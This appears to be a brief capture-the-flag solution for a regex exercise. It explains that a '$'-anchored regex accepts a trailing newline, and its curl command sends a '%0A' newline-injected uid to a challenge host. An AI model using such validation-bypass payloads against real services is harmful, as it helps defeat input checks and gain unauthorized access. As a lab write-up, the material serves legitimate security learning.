# solution for exercise6_REGEX
# you needed to pass the regex condition: $ means regex ends, if new line starts
# add a new line to the url with %0A
curl "http://vuln.redrocket.club:4444/?uid=000%0A" -v